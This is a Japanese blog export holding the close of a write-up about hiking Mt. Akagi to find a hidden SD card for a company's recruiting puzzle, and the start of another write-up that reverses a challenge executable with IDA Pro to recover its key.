<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2415.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2415_thumb.JPG" alt="IMG_2415.JPG" /></a></p>

<p>やっと雪道から解放されました。</p>

<p>少し進むと小沼という湖がでてきました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2416.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2416_thumb.JPG" alt="IMG_2416.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2417.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2417_thumb.JPG" alt="IMG_2417.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2418.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2418_thumb.JPG" alt="IMG_2418.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2419.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2419_thumb.JPG" alt="IMG_2419.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2420.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2420_thumb.JPG" alt="IMG_2420.JPG" /></a></p>

<p>標高1450m地点とのことです。あと一息で目的地周辺です。
凍った湖を左手に眺めながら車道脇をてくてくと歩き進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2422.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2422_thumb.JPG" alt="IMG_2422.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2424.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2424_thumb.JPG" alt="IMG_2424.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2425.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2425_thumb.JPG" alt="IMG_2425.JPG" /></a>
<img src="http://mzyy94.com/blog/resources/images/2015/04/16/route-to-dest.png" alt="route-to-dest.png" /></p>

<p>目的地周辺まで来ました。このときiPhoneの電波は圏外となっていました。</p>

<p>ここからは車道を外れて森の中へと捜索しに行きます。</p>

<h3>午後2　捜索編</h3>

<p>登山道が60cm超の雪まみれだったのにもかかわらず、SDカードが隠されている森は数cmの雪しかありませんでした。
不幸中の幸いというものですね。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2428.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2428_thumb.JPG" alt="IMG_2428.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2429.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2429_thumb.JPG" alt="IMG_2429.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2431.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2431_thumb.JPG" alt="IMG_2431.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2433.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2433_thumb.JPG" alt="IMG_2433.JPG" /></a></p>

<p>道無き道を突き進んでいたのですが、途中で道らしきものを見つけそちらを歩き始めました。
すると、看板とともに分岐点があらわれました。</p>

<p>GPSによると、血の池方面に行けばよさそうなので、そちらへ進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2435.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2435_thumb.JPG" alt="IMG_2435.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2437.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2437_thumb.JPG" alt="IMG_2437.JPG" /></a></p>

<p>血の池に着くと、血の池にまつわる伝説と池の由来が書かれた看板がありました。
この看板を読んでいると、すこし前に目にした単語を見つけました。
そう、hint7.txtに記載のあった<strong>ヤマヒゲナガケンミジンコ</strong>です。
なるほどがってん、あれはこの血の池を指していたんですね。</p>

<p>血の池の中心に来て辺りを見回すと、そこは静かな森でした。まぁ森に入って来たからあたりまえなのですが。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2441.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2441_thumb.JPG" alt="IMG_2441.JPG" /></a></p>

<p>地図を拡大し、GPSだけを頼りにSDカードの位置まで行くと、kanto1_1.jpgに写っているのと同じような岩がたくさんある場所へと来ました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2445.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2445_thumb.JPG" alt="IMG_2445.JPG" /></a></p>

<p>よーくkanto1_1.jpgと目の前の岩岩を見比べ、それらしき岩を特定しました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2446.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2446_thumb.JPG" alt="IMG_2446.JPG" /></a></p>

<p>mondai10.txtによると、<em>ヒント：石の下のミンティア</em>とのことなので、石をめくってみます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2447.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2447_thumb.JPG" alt="IMG_2447.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2449.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2449_thumb.JPG" alt="IMG_2449.JPG" /></a></p>

<p>ありました！ミンティアアップルフィズ味です！</p>

<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00MQE4MG6" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>気になる中身は&#8230;</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2451.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2451_thumb.JPG" alt="IMG_2451.JPG" /></a></p>

<p><strong>待望のSDカードでした！やっとみつかりました！</strong>
9:24につくば駅から電車に乗り、15:24に発見したのでかれこれ6時間の旅でした。
ものすごい達成感とSDカードの中身への興味から、岩場に腰を下ろしSDカードをマウントしてみてみました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2452.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2452_thumb.JPG" alt="IMG_2452.JPG" /></a></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞ mondai10.tc ＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<p>またこの形式か！mondai9で解いたのと同じ、パスワード付きTrueCryptファイルです。
パスワードのヒントはSDカード内にあることは容易に想像がつくので解析しようと思いましたが、
帰りのバスが1本しかない上に、ここからバス停まで何分かかるか不明なため、解析は後回しにしてとりあえず森を抜けることにします。
岩場のすぐ近くに県道へ抜ける道の案内看板があったので、それに従って車道へと出ます。</p>

<h3>午後3　帰宅編</h3>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2454.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2454_thumb.JPG" alt="IMG_2454.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2455.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2455_thumb.JPG" alt="IMG_2455.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2457.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2457_thumb.JPG" alt="IMG_2457.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2458.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2458_thumb.JPG" alt="IMG_2458.JPG" /></a></p>

<p>看板の指示通りに歩いていたら、あっさりと県道へと抜けることができ、さらに県道から血の池までの最短ルートとなる登山道の入り口の案内板がありました。
hint7.txtのヤマヒゲナガケンミジンコから血の池が導けていれば、道無き道を進む必要もなく、この看板から血の池へ向かうことができていたかもしれません。</p>

<p>車道へと出たのであとは道なりにバス停へと向かうことにします。
行きに降車した赤城山大洞バス停へは、あの<strong>険しい登山道</strong>を再度通らないといけないため、少し遠回りになりますが、赤城山ビジターセンターへと向かいます。
行きとは逆で、右手に小沼を眺めながら下っていきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2461.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2461_thumb.JPG" alt="IMG_2461.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2462.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2462_thumb.JPG" alt="IMG_2462.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2465.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2465_thumb.JPG" alt="IMG_2465.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2466.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2466_thumb.JPG" alt="IMG_2466.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2469.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2469_thumb.JPG" alt="IMG_2469.JPG" /></a></p>

<p>ただただ歩き進むだけだったので、何事もなく赤城山ビジターセンターに到着することができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城公園ビジターセンター in 前橋市, 群馬県) <a href="https://t.co/UE7XCVkwDv">https://t.co/UE7XCVkwDv</a> <a href="http://t.co/9EkxDzo5hO">pic.twitter.com/9EkxDzo5hO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584974440947183616">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンターは閉まっていたので外のベンチに腰掛けました。</p>

<p>ビジターセンター横に、赤城山公園に関するお得な掲示板がありました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2477.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2477_thumb.JPG" alt="IMG_2477.JPG" /></a></p>

<p>急いで降りてきた甲斐があってか、バスが来るまで1時間も余裕があったので、持って来たコーヒーと板チョコレートで休憩しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バスが来るまで1時間あるのでチョコとコーヒーで休憩 <a href="http://t.co/RfTO5ZNJA8">pic.twitter.com/RfTO5ZNJA8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980254445305856">2015, 4月 6</a></blockquote>


<p>ここ赤城山ビジターセンターの標高は1365mなため、16:00を過ぎたこの時期は寒く、ダウンジャケットを準備しておいて正解でした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1400mはやっぱり寒い&#10;ダウンジャケット持ってきて正解だったわ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584977161729093632">2015, 4月 6</a></blockquote>


<p>チョコレートを食べ終わり、辺りを見回すと霞がかかってきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>あっやばい霞ががってきた <a href="http://t.co/BK7zs4m0L1">pic.twitter.com/BK7zs4m0L1</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976787811119105">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雲のなかにいる <a href="http://t.co/5KVkzmPEp8">pic.twitter.com/5KVkzmPEp8</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584980779408556033">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨も降ってきたし10m先見えないし怖い <a href="http://t.co/9mq61pmxK3">pic.twitter.com/9mq61pmxK3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584987757157617664">2015, 4月 6</a></blockquote>


<p>雨も降ってきて、このままバスが来なかったらどうしようといった不安から、すこし怖くなりました。</p>

<p>バス到着予定時刻になり、赤城山ビジターセンターバス停で待っていると定刻通りにバスがきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>帰りのバス乗った！！！ これで少なくとも下山できる！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584993731985551360">2015, 4月 6</a></blockquote>


<p>帰りのバスにも乗れ、あとは電車に乗って終電までに帰ることができれば、SDカードの捜索は無事終了となります。</p>

<p>しかしわざわざ群馬県まで来たからには、なにか群馬らしいことをして帰りたいなと思いました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>なぜかグンマーにいるのでGunmaっぽい夕食食べて帰ろうかな</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585002417697099777">2015, 4月 6</a></blockquote>


<p>群馬の名産が何があるか知らなかったので有識者に聞いてみたところ、luminさんからアドバイスをいただきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 焼きまんじゅう、ひもかわうどん（桐生）</p>&mdash; lumin (@lumin) <a href="https://twitter.com/lumin/status/585006039528972288">2015, 4月 6</a></blockquote>


<p><strong>あっ！！！</strong>
hint3.txtに記載のあったひもかわうどんをすっかり忘れてました！</p>

<p>前橋駅に着き、帰路の途中の駅である高崎駅付近のうどん屋さんへと向かうことを決めました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅ついたー 命があるぞー <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/8530G2c0RA">https://t.co/8530G2c0RA</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585014590695669760">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>mondai解いた時にあったひもかわうどんを食しに行かねば <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585015639519006720">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>よし、高崎のひもかわうどん屋へGo <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585017858687545344">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>食うぜひもかわうどん <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/tygSOrl8kj">https://t.co/tygSOrl8kj</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585022094821457920">2015, 4月 6</a></blockquote>


<p>高崎駅に到着した直後にまたも雨に降られてしまいましたが、20分ほどかけてひもかわうどんを扱ううどん屋さんへと歩きました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ひもかわうどん！！ (@ めんいち in 高崎市, 群馬県) <a href="https://t.co/0C5suZrS3F">https://t.co/0C5suZrS3F</a> <a href="http://t.co/4D65OYc4G3">pic.twitter.com/4D65OYc4G3</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585027483772289026">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>hint3.txt kanto1 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/ATgu9JllWm">pic.twitter.com/ATgu9JllWm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585029832964091904">2015, 4月 6</a></blockquote>


<p>名古屋県民の舌にはきしめんを思い出させる食感で、とてもなつかしい気分になりました。</p>

<p>さあ、これで群馬県に思い残すことはありません。
行きで使わなかった学割証を使って高崎駅からJRで南流山まで行き、そこからつくばエクスプレスに乗ってつくば駅に向かって、SDカードの捜索は終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>さらば群馬県 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 高崎駅 (Takasaki Sta.) in 高崎市, 群馬県) <a href="https://t.co/gWMQTyhwoC">https://t.co/gWMQTyhwoC</a> <a href="http://t.co/zZ4UY6GnbL">pic.twitter.com/zZ4UY6GnbL</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585037725440565248">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路のJR乗った <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585040578011762688">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>帰路の電車で原因不明の停止信号受信でパンダグラフ下ろしたそうで電車内真っ暗とかもう、もう <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585043902886846464">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>我が家に帰ってきたような安心感 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/1RrtayjBUG">https://t.co/1RrtayjBUG</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/585085754847719425">2015, 4月 6</a></blockquote>


<h2>費用</h2>

<p>SDカードがあった現地まで出向きたいという方のために、参考までにつくば駅から血の池までの往復でかかった運賃を記しておきます。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">区間          </th>
<th style="text-align:center;"> 種別  </th>
<th style="text-align:right;"> 運賃</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">つくば→流山おおたかの森 </td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 720</td>
</tr>
<tr>
<td style="text-align:center;">流山おおたかの森→足利市 </td>
<td style="text-align:center;"> 東武鉄道 </td>
<td style="text-align:right;"> 885</td>
</tr>
<tr>
<td style="text-align:center;">足利市→足利 </td>
<td style="text-align:center;"> 徒歩 </td>
<td style="text-align:right;"> 0</td>
</tr>
<tr>
<td style="text-align:center;">足利→前橋 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 756</td>
</tr>
<tr>
<td style="text-align:center;">前橋駅→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→赤城山大洞</td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">赤城山ビジターセンター→富士見温泉 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 1200</td>
</tr>
<tr>
<td style="text-align:center;">富士見温泉→前橋駅 </td>
<td style="text-align:center;"> 関越交通バス </td>
<td style="text-align:right;"> 600</td>
</tr>
<tr>
<td style="text-align:center;">前橋→高崎 </td>
<td style="text-align:center;"> JR </td>
<td style="text-align:right;"> 195</td>
</tr>
<tr>
<td style="text-align:center;">高崎→南流山 </td>
<td style="text-align:center;"> JR(学割) </td>
<td style="text-align:right;"> 1550</td>
</tr>
<tr>
<td style="text-align:center;">南流山→つくば</td>
<td style="text-align:center;"> つくばエクスプレス </td>
<td style="text-align:right;"> 822</td>
</tr>
</tbody>
</table>


<p>計8,528円でした。所要時間は、9:24につくば駅発の電車に乗って23:24につくば駅に戻ってくることから、
ギリギリの行程で行く場合は、14時間ほどかかる（＝ほぼ丸一日）ということになります。</p>

<h2>SDカードのmondai</h2>

<p>SDカードを手に入れておしまいではありません。SDカードの中にあるmondai10.tcを開かないことには最終面接へ挑むことができません。
とりあえずAutopsyにSDカードを読ませてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/autopsy-mondai10.png" alt="autopsy-mondai10" /></p>

<p>意外と簡単に問題ファイルが浮上してきました。
削除された0バイトのファイルがあり、そのファイル名は「山名＋最高点の標高を英数字で９文字.txt」となっていました。</p>

<p>登山した赤城山は標高1828mなので、<strong>akagi1828</strong>がmondai10.tcのパスワードだと思われます。</p>

<p>TrueCryptでmondai10.tcを<strong>akagi1828</strong>をパスワードとしてマウントすると、見事イメージをマウントすることができました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/mount-mondai10.png" alt="mount-mondai10" /></p>

<p>マウントしたイメージには何があったでしょうか。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/final-mondai.png" alt="final-mondai" /></p>

<pre style="border:none; color:inherit; background-color:inherit;">
＿人人人人人人人＿
＞　答え.txt　＜
￣Y^Y^Y^Y^Y^Y￣
</pre>


<h1>感想</h1>

<p>mondai9までは日々の隙間時間を使い、少々躓きながらもなんとか時間をかけて解くことができました。
しかし、mondai10がここまで大変であるとは思っていませんでした。
同じ関東だからと舐めてかかっていたために、ギリギリの乗り換えや予想外の雪道に遭遇してつらい思いをしました。
しかし、マイナビに登録してエントリーするなどの就職活動をし、一次選考と二次選考を通過して最終面接に挑む方々と比べると、
雪道を這い上がるなど、苦労の量は比較的少ないようにも思えます。
このようなmondaiを通して就職の機会を与えてくれたネットエージェントさんに感謝するばかりです。</p>

<p>いろいろなmondaiに挑むことで、いろいろな答えを見つけるセンスを身につけられたかと思います。
このような問題を見つけることがあれば、みなさん是非とも挑戦して技量を高めてみてください。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<script>
var a = document.querySelectorAll('a[href$=".JPG"]')
for(var i = 0; i < a.length; i++){a[i].target = "_blank"}
</script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その3]]></title>
    <link href="http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9/"/>
    <updated>2015-04-15T00:01:21+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9</id>
    <content type="html"><![CDATA[<p>あのネットエージェントのいきなり最終面接問題を解いたのでWrite-upを書きました。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでのmondaiはLinuxやOS Xがあれば解くことができていましたが、mondai7からはWindowsの実行ファイル形式やMicrosoft Officeドキュメントが登場したりと、そろそろWindowsがない環境には手厳しい問題となってきました。
なので、今回の記事に掲載のmondaiはすべて（<code>file</code>コマンドでのファイル情報調査以外）、Windows上での解法となっております。</p>

<p>昨日の<a href="http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6/">mondai6までの解法</a>に続いて本日はmondai7、mondai8、mondai9の解法を公開します。</p>

<!-- more -->


<h1>mondai7</h1>

<p>mondai7はnormal.exeというWIN/PE32実行ファイルを解析して答えを得る問題のようです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file normal.exe
</span><span class='line'>normal.exe: PE32 executable <span class="k">for</span> MS Windows <span class="o">(</span>GUI<span class="o">)</span> Intel <span class="m">80386</span> 32-bit
</span></code></pre></td></tr></table></div></figure>


<p>今回はIDA Pro(demo)を使って解析してみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida1.png" alt="normal-ida1.png" /></p>

<p>IDAに解析させて表示を見てみると、おもむろに正解を表示するらしい<em>aCorrectKeyIsS</em>がみつかります。
ここまで来る過程をアセンブリ表示で追っていくことにします。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida2.png" alt="normal-ida2.png" /></p>

<p><em>aCorrectKeyIsS</em>はsprintfで渡されるテンプレート文字列で、そこにコマンドライン引数が埋め込められるようにいなっているようです。
このことから、normal.exeにキー候補の文字列をコマンドライン引数として渡して実行し、なにか判定があり、それが正しい場合に<strong>Correct! KEY is : </strong>に続いてその文字列が表示されるようになっていることがわかります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida3.png" alt="normal-ida3.png" /></p>

<p>すこし遡ってみると、キーが表示される部分のサブルーチンへ来る前に、なにやら条件分岐があります。
コマンドライン第一引数の文字長をstrlenでチェックし、0x0A(=10)と比較し、合致しない場合に<strong>Try Again!</strong>と表示する処理がみつかりました。
このことから、キーは10文字長であることがわかります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida4.png" alt="normal-ida4.png" /></p>

<p>キーが表示される直前に行われる処理を見てみると、サブルーチン<em>sub_4011C0</em>を呼んだ戻り値が0の場合、<strong>Try Again!</strong>の表示をさせるようになっています。
<em>sub_4011C0</em>にはコマンドライン引数を渡しているので、この引数が何か特定の文字列と比較されていると推測できます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida5.png" alt="normal-ida5.png" /></p>

<p>サブルーチン<em>sub_4011C0</em>のはじめの方では、ループインデックス（以下、i）を0にしたりと、forループの初期化が行われている様子がつかめます。このループの中の処理を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida6.png" alt="normal-ida6.png" /></p>

<p>このforループでは、iが0x0A(=10)になるまでループが回れば1を、途中でbreakが発生すれば0をサブルーチン呼び出し元に返すような処理をしています。
途中でbreakが発生する条件は、ループ内で呼ばれる<em>sub_401170</em>の戻り値と謎の配列<em>dword_40C068</em>の比較が偽である場合となっています。
要するに、このループがi=10になるまで回らないと呼び出し元に0が返され、<strong>Try Again!</strong>が表示されるということです。</p>

<p>コマンドライン引数のi番目の文字が引数として渡されて呼び出されている<em>sub_401170</em>を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida7.png" alt="normal-ida7.png" /></p>

<p><em>sub_401170</em>はサブルーチンの引数で与えられた文字（＝コマンドライン引数のi番目の文字）が、謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の中の何番目に出てくるかを、forループを回して一つずつチェックしているようです。そしてサブルーチンの戻り値として、謎の文字列の何番目に引数の文字が現れたかを呼び出し元に返しています。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/normal-ida8.png" alt="normal-ida8.png" /></p>

<p>謎の配列<em>dword_40C068</em>の中身を見に行くと、unsignled long型の配列として、数値が格納されていました。
先のサブルーチン<em>sub_4011C0</em>のループ内では、コマンドライン引数のi番目の文字を<em>sub_401170</em>に渡し、謎の文字列の何番目に出現するかを取得し、その値とこの<em>dword_40C068</em>のi番目の数値を比較して、同じであればループを継続するという処理でした。</p>

<p>ここまでの調査を基にまとめると、このプログラムの処理は簡易的に以下のようになっていることがわかります。</p>

<ul>
<li>コマンドライン引数に与えられた文字列があり、</li>
<li>その文字列は10文字であり、</li>
<li>その文字列の1文字1文字が謎の文字列<strong>&#8220;efyTUwxqrY&#8230;&#8221;</strong>の何番目に位置するかを調べていて、</li>
<li>その位置がすべて謎の配列<em>dword_40C068</em>に定義されたもの同じであれば<strong>Correct! Key is :</strong>に続けて引数を表示する</li>
</ul>


<p>なので逆に考えると、謎の文字列の中の、謎の配列に定義されている場所の文字を抽出すればキーが見つかるということです。
パパッと以下のようなものを書いてキーを抽出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="n">string</span> <span class="o">=</span> <span class="s2">&quot;efyTUwxqrYHEFmduCJAXQpgKLBnhiltINPGOoszkMDvcjabSZRVW&quot;</span>
